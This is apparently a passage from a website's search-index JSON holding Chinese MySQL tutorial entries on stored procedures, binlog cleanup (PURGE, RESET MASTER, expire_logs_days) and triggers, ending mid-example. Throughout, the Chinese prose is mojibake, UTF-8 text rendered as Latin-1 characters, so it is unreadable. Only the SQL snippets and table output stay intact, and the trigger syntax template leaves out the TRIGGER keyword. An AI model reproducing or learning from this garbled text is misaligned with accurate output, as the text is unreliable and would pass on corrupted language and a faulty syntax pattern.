è·³è¿‡æ­¤æ¬¡å¾ªç¯ END IF; SET SUM = SUM+num; END LOOP demo_sum; -- å¾ªç¯ç»“æŸ END$$ DELIMITER; ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹æ’å…¥ä¿¡æ¯: DELIMITER $$ CREATE PROCEDURE demo9(IN s_student VARCHAR(10),IN s_sex CHAR(1),OUT s_result VARCHAR(20)) BEGIN -- å£°æ˜ä¸€ä¸ªå˜é‡ ç”¨æ¥å†³å®šè¿™ä¸ªåå­—æ˜¯å¦å·²ç»å­˜åœ¨ DECLARE s_count INT DEFAULT 0; -- éªŒè¯è¿™ä¹ˆåå­—æ˜¯å¦å·²ç»å­˜åœ¨ SELECT COUNT(*) INTO s_count FROM student WHERE `name` = s_student; IF s_count = 0 THEN INSERT INTO student (`name`, sex) VALUES(s_student, s_sex); SET s_result = 'æ•°æ®æ·»åŠ æˆåŠŸ'; ELSE SET s_result = 'åå­—å·²å­˜åœ¨ï¼Œä¸èƒ½æ·»åŠ '; SELECT s_result; END IF; END$$ DELIMITER; å‚è€ƒ: MySQLä¸­çš„å­˜å‚¨è¿‡ç¨‹ï¼ˆè¯¦ç»†ç¯‡ï¼‰ æ›´å¤šè¯¦æƒ…: MySQL å­˜å‚¨è¿‡ç¨‹","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Stored-procedure.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Stored-procedure.html"},{"title":"binlog","text":"binlogæ˜¯Mysql severå±‚ç»´æŠ¤çš„ä¸€ç§äºŒè¿›åˆ¶æ—¥å¿—ï¼Œ ä¸innodbå¼•æ“ä¸­çš„redo/undo logæ˜¯å®Œå…¨ä¸åŒçš„æ—¥å¿—ï¼› å…¶ä¸»è¦æ˜¯ç”¨æ¥è®°å½•å¯¹mysqlæ•°æ®æ›´æ–°æˆ–æ½œåœ¨å‘ç”Ÿæ›´æ–°çš„SQLè¯­å¥ï¼Œå¹¶ä»¥\"äº‹åŠ¡\"çš„å½¢å¼ä¿å­˜åœ¨ç£ç›˜ä¸­ï¼› ä½œç”¨ä¸»è¦æœ‰ï¼š å¤åˆ¶ï¼šMySQL Replicationåœ¨Masterç«¯å¼€å¯binlogï¼Œ MasteræŠŠå®ƒçš„äºŒè¿›åˆ¶æ—¥å¿—ä¼ é€’ç»™slaveså¹¶å›æ”¾æ¥è¾¾åˆ°master-slaveæ•°æ®ä¸€è‡´çš„ç›®çš„ æ•°æ®æ¢å¤ï¼šé€šè¿‡mysqlbinlogå·¥å…·æ¢å¤æ•°æ® å¢é‡å¤‡ä»½ Binlog åŒ…æ‹¬ä¸¤ç±»æ–‡ä»¶ï¼š äºŒè¿›åˆ¶æ—¥å¿—ç´¢å¼•æ–‡ä»¶(.index)ï¼šè®°å½•æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶(.00000*)ï¼šè®°å½•æ‰€æœ‰ DDL å’Œ DML è¯­å¥äº‹ä»¶ã€‚ redo log ä¿è¯ä¸€è‡´æ€§ï¼ˆå°†ä¿®æ”¹åçš„æ•°æ®è®°å½•ï¼Œå½“å‰è¯­å¥ï¼‰ undo log ä¿è¯åŸå­æ€§ï¼ˆå°†ä¿®æ”¹å‰çš„æ•°æ®è®°å½•ï¼Œä¸å½“å‰è¯­å¥ç›¸åçš„è¯­å¥ï¼‰ binlogçš„æ¸…é™¤/ä¸è®°å½• ä¸è®°å½• åœ¨ é…ç½®æ–‡ä»¶çš„ mysqld ä¸‹å†™å…¥ skip-log-bin æ¸…é™¤ æ‰‹åŠ¨æ¸…ç† , æŸ¥çœ‹ä¸»ä»åº“ä½¿ç”¨çš„æ˜¯å“ªä¸ªbinlogæ–‡ä»¶: show master status; show slave status; åˆ é™¤ä¹‹å‰å¯ä»¥å…ˆåšä¸ªå¤‡ä»½ æ¸…é™¤æŒ‡å®šæ—¥æœŸçš„å¤‡ä»½: purge master logs before '2016-09-01 17:20:00'; //åˆ é™¤æŒ‡å®šæ—¥æœŸä»¥å‰çš„æ—¥å¿—ç´¢å¼•ä¸­binlogæ—¥å¿—æ–‡ä»¶ æˆ–è€…: purge master logs to'mysql-bin.000022'; //åˆ é™¤æŒ‡å®šæ—¥å¿—æ–‡ä»¶çš„æ—¥å¿—ç´¢å¼•ä¸­binlogæ—¥å¿—æ–‡ä»¶ æ³¨è§£ ä½¿ç”¨è¯¥è¯­æ³•ï¼Œä¼šå°†å¯¹åº”çš„æ–‡ä»¶å’Œmysql-bin.indexä¸­å¯¹åº”è·¯å¾„åˆ é™¤ æ—¶é—´å’Œæ–‡ä»¶åä¸€å®šä¸å¯ä»¥å†™é”™ï¼Œå°¤å…¶æ˜¯æ—¶é—´ä¸­çš„å¹´å’Œæ–‡ä»¶åä¸­çš„åºå·ï¼Œ ä»¥é˜²ä¸å°å¿ƒå°†æ­£åœ¨ä½¿ç”¨çš„binlogåˆ é™¤ï¼ï¼ï¼åˆ‡å‹¿åˆ é™¤æ­£åœ¨ä½¿ç”¨çš„binlog reset master:å°†åˆ é™¤æ—¥å¿—ç´¢å¼•æ–‡ä»¶ä¸­è®°å½•çš„æ‰€æœ‰binlogæ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„æ—¥å¿—æ–‡ä»¶ï¼Œèµ·å§‹å€¼ä»000001å¼€å§‹ã€‚ä¸è¦è½»æ˜“ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤é€šå¸¸ä»…ä»…ç”¨äºç¬¬ä¸€æ¬¡ç”¨äºæ­å»ºä¸»ä»å…³ç³»çš„æ—¶çš„ä¸»åº“ã€‚ reset slave:æ¸…é™¤master.infoæ–‡ä»¶ã€relay-log.infoæ–‡ä»¶ï¼Œä»¥åŠæ‰€æœ‰çš„relay logæ–‡ä»¶,å¹¶é‡æ–°å¯ç”¨ä¸€ä¸ªæ–°çš„relaylogæ–‡ä»¶ è‡ªåŠ¨æ¸…ç† è®¾ç½®binlogè¿‡æœŸæ—¶é—´ï¼Œä½¿ç³»ç»Ÿè‡ªåŠ¨åˆ é™¤binlogæ–‡ä»¶ åœ¨mysqlä¸­ä¿®æ”¹ , æŸ¥çœ‹binlogè¿‡æœŸæ—¶é—´ï¼Œè¿™ä¸ªå€¼é»˜è®¤æ˜¯0å¤©ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸è‡ªåŠ¨æ¸…ç†ï¼Œå¯ä»¥æ ¹æ®ç”Ÿäº§æƒ…å†µä¿®æ”¹ï¼Œæœ¬ä¾‹ä¿®æ”¹ä¸º7å¤©: mysql> show variables like 'expire_logs_days'; +------------------------+-------+ | Variable_name | Value | +------------------------+-------+ | expire_logs_days | 0 | +------------------------+-------+ mysql> set global expire_logs_days = 7; #è®¾ç½®binlogå¤šå°‘å¤©è¿‡æœŸ è®¾ç½®ä¹‹åä¸ä¼šç«‹å³æ¸…é™¤ï¼Œè§¦å‘æ¡ä»¶æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š binlogå¤§å°è¶…è¿‡max_binlog_sizeï¼Œmax_binlog_sizeé»˜è®¤ä¸º1G æ‰‹åŠ¨æ‰§è¡Œflush logs å¦‚æœbinlogéå¸¸å¤šï¼Œä¸è¦è½»æ˜“è®¾ç½®è¯¥å‚æ•°ï¼Œæœ‰å¯èƒ½å¯¼è‡´IOäº‰ç”¨ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨purgeå‘½ä»¤äºˆä»¥æ¸…é™¤ï¼š å°†bin.000055ä¹‹å‰çš„binlogæ¸…æ‰: mysql>purge binary logs to 'bin.000055'; å°†æŒ‡å®šæ—¶é—´ä¹‹å‰çš„binlogæ¸…æ‰: mysql>purge binary logs before '2017-05-01 13:09:51'; é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ mysqldåœ¨æ¯ä¸ªäºŒè¿›åˆ¶æ—¥å¿—ååé¢æ·»åŠ ä¸€ä¸ªæ•°å­—æ‰©å±•åã€‚ æ¯æ¬¡ä½ å¯åŠ¨æœåŠ¡å™¨æˆ–åˆ·æ–°æ—¥å¿—æ—¶è¯¥æ•°å­—åˆ™å¢åŠ ã€‚ å¦‚æœå½“å‰æ—¥å¿—å¤§å°è¾¾åˆ°max_binlog_size,è¿˜ä¼šè‡ªåŠ¨åˆ›å»ºæ–°çš„äºŒè¿›åˆ¶æ—¥å¿—ã€‚ å¦‚æœä½ æ­£ä½¿ç”¨å¤§çš„äº‹åŠ¡ï¼ŒäºŒè¿›åˆ¶æ—¥å¿—è¿˜ä¼šè¶…è¿‡max_binlog_size:äº‹åŠ¡å…¨å†™å…¥ä¸€ä¸ªäºŒè¿›åˆ¶æ—¥å¿—ä¸­ï¼Œç»å¯¹ä¸è¦å†™å…¥ä¸åŒçš„äºŒè¿›åˆ¶æ—¥å¿—ä¸­ã€‚ expire_logs_days å®šä¹‰äº†mysqlæ¸…é™¤è¿‡æœŸæ—¥å¿—çš„æ—¶é—´ã€‚é»˜è®¤å€¼ä¸º0,è¡¨ç¤º\"æ²¡æœ‰è‡ªåŠ¨åˆ é™¤\"ã€‚ max_binlog_size äºŒè¿›åˆ¶æ—¥å¿—æœ€å¤§å¤§å°ï¼Œå¦‚æœäºŒè¿›åˆ¶æ—¥å¿—å†™å…¥çš„å†…å®¹è¶…å‡ºç»™å®šå€¼ï¼Œæ—¥å¿—å°±ä¼šå‘ç”Ÿæ»šåŠ¨ã€‚ ä½ ä¸èƒ½å°†è¯¥å˜é‡è®¾ç½®ä¸ºå¤§äº1GBæˆ–å°äº4096å­—èŠ‚ã€‚ é»˜è®¤å€¼æ˜¯1GBã€‚ åœ¨my.cnfä¸­æ·»åŠ é…ç½®,è®¾ç½®è¿‡æœŸæ—¶é—´ä¸º30å¤©: expire_logs_days = 30 max_binlog_sizeä½¿ç”¨é»˜è®¤å€¼å³å¯ æ³¨è§£ è¿‡æœŸæ—¶é—´è®¾ç½®çš„è¦é€‚å½“ï¼Œå¯¹äºä¸»ä»å¤åˆ¶ï¼Œè¦çœ‹ä»åº“çš„å»¶è¿Ÿå†³å®šè¿‡æœŸæ—¶é—´ï¼Œ é¿å…ä¸»åº“binlogè¿˜æœªä¼ åˆ°ä»åº“ä¾¿å› è¿‡æœŸè€Œåˆ é™¤ï¼Œå¯¼è‡´ä¸»ä»ä¸ä¸€è‡´ï¼ï¼ï¼","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-binlog.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-binlog.html"},{"title":"è§¦å‘å™¨","text":"MySQLæ•°æ®åº“ä¸­è§¦å‘å™¨æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å­˜å‚¨è¿‡ç¨‹ï¼Œ ä¸åŒçš„æ˜¯æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹è¦ä½¿ç”¨ CALL è¯­å¥æ¥è°ƒç”¨ï¼Œ è€Œè§¦å‘å™¨çš„æ‰§è¡Œä¸éœ€è¦ä½¿ç”¨ CALL è¯­å¥æ¥è°ƒç”¨ï¼Œä¹Ÿä¸éœ€è¦æ‰‹å·¥å¯åŠ¨ï¼Œ åªè¦ä¸€ä¸ªé¢„å®šä¹‰çš„äº‹ä»¶å‘ç”Ÿå°±ä¼šè¢« MySQLè‡ªåŠ¨è°ƒç”¨ã€‚ å¼•å‘è§¦å‘å™¨æ‰§è¡Œçš„äº‹ä»¶ä¸€èˆ¬å¦‚ä¸‹ï¼š å¢åŠ ä¸€æ¡å­¦ç”Ÿè®°å½•æ—¶ï¼Œä¼šè‡ªåŠ¨æ£€æŸ¥å¹´é¾„æ˜¯å¦ç¬¦åˆèŒƒå›´è¦æ±‚ã€‚ æ¯å½“åˆ é™¤ä¸€æ¡å­¦ç”Ÿä¿¡æ¯æ—¶ï¼Œè‡ªåŠ¨åˆ é™¤å…¶æˆç»©è¡¨ä¸Šçš„å¯¹åº”è®°å½•ã€‚ æ¯å½“åˆ é™¤ä¸€æ¡æ•°æ®æ—¶ï¼Œåœ¨æ•°æ®åº“å­˜æ¡£è¡¨ä¸­ä¿ç•™ä¸€ä¸ªå¤‡ä»½å‰¯æœ¬ã€‚ è§¦å‘ç¨‹åºçš„ä¼˜ç‚¹å¦‚ä¸‹ï¼š è§¦å‘ç¨‹åºçš„æ‰§è¡Œæ˜¯è‡ªåŠ¨çš„ï¼Œå½“å¯¹è§¦å‘ç¨‹åºç›¸å…³è¡¨çš„æ•°æ®åšå‡ºç›¸åº”çš„ä¿®æ”¹åç«‹å³æ‰§è¡Œã€‚ è§¦å‘ç¨‹åºå¯ä»¥é€šè¿‡æ•°æ®åº“ä¸­ç›¸å…³çš„è¡¨å±‚å ä¿®æ”¹å¦å¤–çš„è¡¨ã€‚ è§¦å‘ç¨‹åºå¯ä»¥å®æ–½æ¯” FOREIGN KEY çº¦æŸã€CHECK çº¦æŸæ›´ä¸ºå¤æ‚çš„æ£€æŸ¥å’Œæ“ä½œã€‚ è§¦å‘å™¨ä¸è¡¨å…³ç³»å¯†åˆ‡ï¼Œä¸»è¦ç”¨äºä¿æŠ¤è¡¨ä¸­çš„æ•°æ®ã€‚ ç‰¹åˆ«æ˜¯å½“æœ‰å¤šä¸ªè¡¨å…·æœ‰ä¸€å®šçš„ç›¸äº’è”ç³»çš„æ—¶å€™ï¼Œè§¦å‘å™¨èƒ½å¤Ÿè®©ä¸åŒçš„è¡¨ä¿æŒæ•°æ®çš„ä¸€è‡´æ€§ã€‚ åœ¨ MySQL ä¸­ï¼Œåªæœ‰æ‰§è¡Œ INSERTã€UPDATE å’Œ DELETE æ“ä½œæ—¶æ‰èƒ½æ¿€æ´»è§¦å‘å™¨ã€‚ åœ¨å®é™…ä½¿ç”¨ä¸­ï¼ŒMySQL æ‰€æ”¯æŒçš„è§¦å‘å™¨æœ‰ä¸‰ç§ï¼š INSERT è§¦å‘å™¨ UPDATE è§¦å‘å™¨ DELETE è§¦å‘å™¨ INSERT è§¦å‘å™¨ åœ¨ INSERT è¯­å¥æ‰§è¡Œä¹‹å‰æˆ–ä¹‹åå“åº”çš„è§¦å‘å™¨ã€‚ ä½¿ç”¨ INSERT è§¦å‘å™¨éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åœ¨ INSERT è§¦å‘å™¨ä»£ç å†…ï¼Œå¯å¼•ç”¨ä¸€ä¸ªåä¸º NEWï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰çš„è™šæ‹Ÿè¡¨æ¥è®¿é—®è¢«æ’å…¥çš„è¡Œã€‚ åœ¨ BEFORE INSERT è§¦å‘å™¨ä¸­ï¼ŒNEW ä¸­çš„å€¼ä¹Ÿå¯ä»¥è¢«æ›´æ–°ï¼Œå³å…è®¸æ›´æ”¹è¢«æ’å…¥çš„å€¼ï¼ˆåªè¦å…·æœ‰å¯¹åº”çš„æ“ä½œæƒé™ï¼‰ã€‚ å¯¹äº AUTO_INCREMENT åˆ—ï¼ŒNEW åœ¨ INSERT æ‰§è¡Œä¹‹å‰åŒ…å«çš„å€¼æ˜¯ 0ï¼Œåœ¨ INSERT æ‰§è¡Œä¹‹åå°†åŒ…å«æ–°çš„è‡ªåŠ¨ç”Ÿæˆå€¼ã€‚ UPDATE è§¦å‘å™¨ åœ¨ UPDATE è¯­å¥æ‰§è¡Œä¹‹å‰æˆ–ä¹‹åå“åº”çš„è§¦å‘å™¨ã€‚ ä½¿ç”¨ UPDATE è§¦å‘å™¨éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åœ¨ UPDATE è§¦å‘å™¨ä»£ç å†…ï¼Œå¯å¼•ç”¨ä¸€ä¸ªåä¸º NEWï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰çš„è™šæ‹Ÿè¡¨æ¥è®¿é—®æ›´æ–°çš„å€¼ã€‚ åœ¨ UPDATE è§¦å‘å™¨ä»£ç å†…ï¼Œå¯å¼•ç”¨ä¸€ä¸ªåä¸º OLDï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰çš„è™šæ‹Ÿè¡¨æ¥è®¿é—® UPDATE è¯­å¥æ‰§è¡Œå‰çš„å€¼ã€‚ åœ¨ BEFORE UPDATE è§¦å‘å™¨ä¸­ï¼ŒNEW ä¸­çš„å€¼å¯èƒ½ä¹Ÿè¢«æ›´æ–°ï¼Œå³å…è®¸æ›´æ”¹å°†è¦ç”¨äº UPDATE è¯­å¥ä¸­çš„å€¼ï¼ˆåªè¦å…·æœ‰å¯¹åº”çš„æ“ä½œæƒé™ï¼‰ã€‚ OLD ä¸­çš„å€¼å…¨éƒ¨æ˜¯åªè¯»çš„ï¼Œä¸èƒ½è¢«æ›´æ–°ã€‚ æ³¨è§£ å½“è§¦å‘å™¨è®¾è®¡å¯¹è§¦å‘è¡¨è‡ªèº«çš„æ›´æ–°æ“ä½œæ—¶ï¼Œåªèƒ½ä½¿ç”¨ BEFORE ç±»å‹çš„è§¦å‘å™¨ï¼ŒAFTER ç±»å‹çš„è§¦å‘å™¨å°†ä¸è¢«å…è®¸ã€‚ DELETE è§¦å‘å™¨ åœ¨ DELETE è¯­å¥æ‰§è¡Œä¹‹å‰æˆ–ä¹‹åå“åº”çš„è§¦å‘å™¨ã€‚ ä½¿ç”¨ DELETE è§¦å‘å™¨éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åœ¨ DELETE è§¦å‘å™¨ä»£ç å†…ï¼Œå¯ä»¥å¼•ç”¨ä¸€ä¸ªåä¸º OLDï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰çš„è™šæ‹Ÿè¡¨æ¥è®¿é—®è¢«åˆ é™¤çš„è¡Œã€‚ OLD ä¸­çš„å€¼å…¨éƒ¨æ˜¯åªè¯»çš„ï¼Œä¸èƒ½è¢«æ›´æ–°ã€‚ æ€»ä½“æ¥è¯´ï¼Œè§¦å‘å™¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼ŒMySQL ä¼šæŒ‰ç…§ä»¥ä¸‹æ–¹å¼æ¥å¤„ç†é”™è¯¯ã€‚ è‹¥å¯¹äºäº‹åŠ¡æ€§è¡¨ï¼Œå¦‚æœè§¦å‘ç¨‹åºå¤±è´¥ï¼Œä»¥åŠç”±æ­¤å¯¼è‡´çš„æ•´ä¸ªè¯­å¥å¤±è´¥ï¼Œé‚£ä¹ˆè¯¥è¯­å¥æ‰€æ‰§è¡Œçš„æ‰€æœ‰æ›´æ”¹å°†å›æ»šï¼› å¯¹äºéäº‹åŠ¡æ€§è¡¨ï¼Œåˆ™ä¸èƒ½æ‰§è¡Œæ­¤ç±»å›æ»šï¼Œå³ä½¿è¯­å¥å¤±è´¥ï¼Œå¤±è´¥ä¹‹å‰æ‰€åšçš„ä»»ä½•æ›´æ”¹ä¾ç„¶æœ‰æ•ˆã€‚ è‹¥ BEFORE è§¦å‘ç¨‹åºå¤±è´¥ï¼Œåˆ™ MySQL å°†ä¸æ‰§è¡Œç›¸åº”è¡Œä¸Šçš„æ“ä½œã€‚ è‹¥åœ¨ BEFORE æˆ– AFTER è§¦å‘ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œåˆ™å°†å¯¼è‡´è°ƒç”¨è§¦å‘ç¨‹åºçš„æ•´ä¸ªè¯­å¥å¤±è´¥ã€‚ ä»…å½“ BEFORE è§¦å‘ç¨‹åºå’Œè¡Œæ“ä½œå‡å·²è¢«æˆåŠŸæ‰§è¡Œï¼ŒMySQL æ‰ä¼šæ‰§è¡ŒAFTERè§¦å‘ç¨‹åºã€‚ è§¦å‘å™¨çš„æ‰§è¡Œé¡ºåº æˆ‘ä»¬å»ºç«‹çš„æ•°æ®åº“ä¸€èˆ¬éƒ½æ˜¯ InnoDB æ•°æ®åº“ï¼Œå…¶ä¸Šå»ºç«‹çš„è¡¨æ˜¯äº‹åŠ¡æ€§è¡¨ï¼Œä¹Ÿå°±æ˜¯äº‹åŠ¡å®‰å…¨çš„ã€‚ è¿™æ—¶ï¼Œè‹¥SQLè¯­å¥æˆ–è§¦å‘å™¨æ‰§è¡Œå¤±è´¥ï¼ŒMySQL ä¼šå›æ»šäº‹åŠ¡ï¼Œæœ‰ï¼š å¦‚æœ BEFORE è§¦å‘å™¨æ‰§è¡Œå¤±è´¥ï¼ŒSQL æ— æ³•æ­£ç¡®æ‰§è¡Œ SQL æ‰§è¡Œå¤±è´¥æ—¶ï¼ŒAFTER å‹è§¦å‘å™¨ä¸ä¼šè§¦å‘ AFTER ç±»å‹çš„è§¦å‘å™¨æ‰§è¡Œå¤±è´¥ï¼ŒSQL ä¼šå›æ»š MySQLåˆ›å»ºè§¦å‘å™¨ï¼ˆCREATE TRIGGERï¼‰ è§¦å‘å™¨æ˜¯ä¸ MySQLæ•°æ®è¡¨æœ‰å…³çš„æ•°æ®åº“å¯¹è±¡ï¼Œåœ¨æ»¡è¶³å®šä¹‰æ¡ä»¶æ—¶è§¦å‘ï¼Œå¹¶æ‰§è¡Œè§¦å‘å™¨ä¸­å®šä¹‰çš„è¯­å¥é›†åˆã€‚ è§¦å‘å™¨çš„è¿™ç§ç‰¹æ€§å¯ä»¥ååŠ©åº”ç”¨åœ¨æ•°æ®åº“ç«¯ç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§ã€‚ åŸºæœ¬è¯­æ³• åœ¨ MySQL 5.7 ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ CREATE TRIGGER è¯­å¥åˆ›å»ºè§¦å‘å™¨ã€‚ è¯­æ³•æ ¼å¼å¦‚ä¸‹: CREATE <è§¦å‘å™¨å> < BEFORE | AFTER > <INSERT | UPDATE | DELETE > ON <è¡¨å> FOR EACH Row<è§¦å‘å™¨ä¸»ä½“> è¯­æ³•è¯´æ˜å¦‚ä¸‹ è§¦å‘å™¨å è§¦å‘å™¨çš„åç§°ï¼Œè§¦å‘å™¨åœ¨å½“å‰æ•°æ®åº“ä¸­å¿…é¡»å…·æœ‰å”¯ä¸€çš„åç§°ã€‚ å¦‚æœè¦åœ¨æŸä¸ªç‰¹å®šæ•°æ®åº“ä¸­åˆ›å»ºï¼Œåç§°å‰é¢åº”è¯¥åŠ ä¸Šæ•°æ®åº“çš„åç§°ã€‚ INSERT | UPDATE | DELETE è§¦å‘äº‹ä»¶ï¼Œç”¨äºæŒ‡å®šæ¿€æ´»è§¦å‘å™¨çš„è¯­å¥çš„ç§ç±»ã€‚ æ³¨æ„ï¼šä¸‰ç§è§¦å‘å™¨çš„æ‰§è¡Œæ—¶é—´å¦‚ä¸‹ã€‚ INSERTï¼šå°†æ–°è¡Œæ’å…¥è¡¨æ—¶æ¿€æ´»è§¦å‘å™¨ã€‚ ä¾‹å¦‚ï¼ŒINSERT çš„ BEFORE è§¦å‘å™¨ä¸ä»…èƒ½è¢« MySQL çš„ INSERT è¯­å¥æ¿€æ´»ï¼Œä¹Ÿèƒ½è¢« LOAD DATA è¯­å¥æ¿€æ´»ã€‚ DELETEï¼š ä»è¡¨ä¸­åˆ é™¤æŸä¸€è¡Œæ•°æ®æ—¶æ¿€æ´»è§¦å‘å™¨ï¼Œä¾‹å¦‚ DELETE å’Œ REPLACE è¯­å¥ã€‚ UPDATEï¼šæ›´æ”¹è¡¨ä¸­æŸä¸€è¡Œæ•°æ®æ—¶æ¿€æ´»è§¦å‘å™¨ï¼Œä¾‹å¦‚ UPDATE è¯­å¥ã€‚ BEFORE | AFTER BEFORE å’Œ AFTERï¼Œè§¦å‘å™¨è¢«è§¦å‘çš„æ—¶åˆ»ï¼Œè¡¨ç¤ºè§¦å‘å™¨æ˜¯åœ¨æ¿€æ´»å®ƒçš„è¯­å¥ä¹‹å‰æˆ–ä¹‹åè§¦å‘ã€‚ è‹¥å¸Œæœ›éªŒè¯æ–°æ•°æ®æ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä½¿ç”¨ BEFORE é€‰é¡¹ï¼› è‹¥å¸Œæœ›åœ¨æ¿€æ´»è§¦å‘å™¨çš„è¯­å¥æ‰§è¡Œä¹‹åå®Œæˆå‡ ä¸ªæˆ–æ›´å¤šçš„æ”¹å˜ï¼Œåˆ™é€šå¸¸ä½¿ç”¨ AFTER é€‰é¡¹ã€‚ è¡¨å ä¸è§¦å‘å™¨ç›¸å…³è”çš„è¡¨åï¼Œæ­¤è¡¨å¿…é¡»æ˜¯æ°¸ä¹…æ€§è¡¨ï¼Œä¸èƒ½å°†è§¦å‘å™¨ä¸ä¸´æ—¶è¡¨æˆ–è§†å›¾å…³è”èµ·æ¥ã€‚ åœ¨è¯¥è¡¨ä¸Šè§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶æ‰ä¼šæ¿€æ´»è§¦å‘å™¨ã€‚ åŒä¸€ä¸ªè¡¨ä¸èƒ½æ‹¥æœ‰ä¸¤ä¸ªå…·æœ‰ç›¸åŒè§¦å‘æ—¶åˆ»å’Œäº‹ä»¶çš„è§¦å‘å™¨ã€‚ ä¾‹å¦‚ï¼Œå¯¹äºä¸€å¼ æ•°æ®è¡¨ï¼Œä¸èƒ½åŒæ—¶æœ‰ä¸¤ä¸ª BEFORE UPDATE è§¦å‘å™¨ï¼Œ ä½†å¯ä»¥æœ‰ä¸€ä¸ª BEFORE UPDATE è§¦å‘å™¨å’Œä¸€ä¸ª BEFORE INSERT è§¦å‘å™¨ï¼Œ æˆ–ä¸€ä¸ª BEFORE UPDATE è§¦å‘å™¨å’Œä¸€ä¸ª AFTER UPDATE è§¦å‘å™¨ã€‚ è§¦å‘å™¨ä¸»ä½“ è§¦å‘å™¨åŠ¨ä½œä¸»ä½“ï¼ŒåŒ…å«è§¦å‘å™¨æ¿€æ´»æ—¶å°†è¦æ‰§è¡Œçš„ MySQL è¯­å¥ã€‚ å¦‚æœè¦æ‰§è¡Œå¤šä¸ªè¯­å¥ï¼Œå¯ä½¿ç”¨ BEGINâ€¦END å¤åˆè¯­å¥ç»“æ„ã€‚ FOR EACH ROW ä¸€èˆ¬æ˜¯æŒ‡è¡Œçº§è§¦å‘ï¼Œå¯¹äºå—è§¦å‘äº‹ä»¶å½±å“çš„æ¯ä¸€è¡Œéƒ½è¦æ¿€æ´»è§¦å‘å™¨çš„åŠ¨ä½œã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ INSERT è¯­å¥å‘æŸä¸ªè¡¨ä¸­æ’å…¥å¤šè¡Œæ•°æ®æ—¶ï¼Œè§¦å‘å™¨ä¼šå¯¹æ¯ä¸€è¡Œæ•°æ®çš„æ’å…¥éƒ½æ‰§è¡Œç›¸åº”çš„è§¦å‘å™¨åŠ¨ä½œã€‚ æ³¨è§£ æ¯ä¸ªè¡¨éƒ½æ”¯æŒ INSERTã€UPDATE å’Œ DELETE çš„ BEFORE ä¸ AFTERï¼Œå› æ­¤æ¯ä¸ªè¡¨æœ€å¤šæ”¯æŒ 6 ä¸ªè§¦å‘å™¨ã€‚ æ¯ä¸ªè¡¨çš„æ¯ä¸ªäº‹ä»¶æ¯æ¬¡åªå…è®¸æœ‰ä¸€ä¸ªè§¦å‘å™¨ã€‚å•ä¸€è§¦å‘å™¨ä¸èƒ½ä¸å¤šä¸ªäº‹ä»¶æˆ–å¤šä¸ªè¡¨å…³è”ã€‚ å¦å¤–ï¼Œåœ¨ MySQL ä¸­ï¼Œè‹¥éœ€è¦ æŸ¥çœ‹æ•°æ®åº“ä¸­å·²æœ‰çš„è§¦å‘å™¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ SHOW TRIGGERS è¯­å¥ã€‚ æ³¨è§£ å¦‚æœè§¦å‘å™¨çš„é€»è¾‘å—åªåŒ…å«ä¸€ä¸ªè¯­å¥ï¼Œæ‚¨å¯ä»¥çœç•¥ BEGIN å’Œ END å…³é”®å­—ã€‚ åˆ›å»º BEFORE ç±»å‹è§¦å‘å™¨ ä»¥, t1è¡¨ä¸ºä¾‹: mysql> show create table t1 \\G; *************************** 1. row *************************** Table: t1 Create Table: CREATE TABLE `t1` ( `id` int NOT NULL, `name` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, `birth` datetime DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci 1 row in set (0.00 sec) ERROR: No query specified å…³äºæ­¤è¡¨åˆ›å»ºå¯è§ TableCreate , åç»­ç”¨ä¾‹éƒ½ä»¥æ­¤è¡¨æ“ä½œ. æŸ¥çœ‹è¡¨ä¿¡æ¯: mysql> desc t1; +-------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+--------------+------+-----+---------+-------+ | id | int | NO | PRI | NULL | | | name | varchar(255) | YES | | NULL | | | age | int | YES | | NULL | | | birth | datetime | YES | | NULL | | +-------+--------------+------+-----+---------+-------+ 4 rows in set (0.00 sec) åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, åœ¨æ’å…¥è¡¨ä¹‹å‰, ç»Ÿè®¡è®¡ç®—ä¸‹äººæ•°, æ€»å¹´é¾„, å¹³å‡å¹´é¾„: mysql> delimiter $$ mysql> create trigger AvgAge -> before insert -> on t1 -> for each row -> begin -> set @nums = @nums + 1; -> set @sumAge = @sumAge + new.age; -> set @sumAvgAge = @sumAge / @nums; -> end $$ Query OK, 0 rows affected (0.02 sec) mysql> delimiter ; mysql> ä½¿ç”¨, éœ€è¦å…ˆå®šä¹‰ä¸€ä¸‹å˜é‡: mysql> set @nums=0, @sumAge=0, 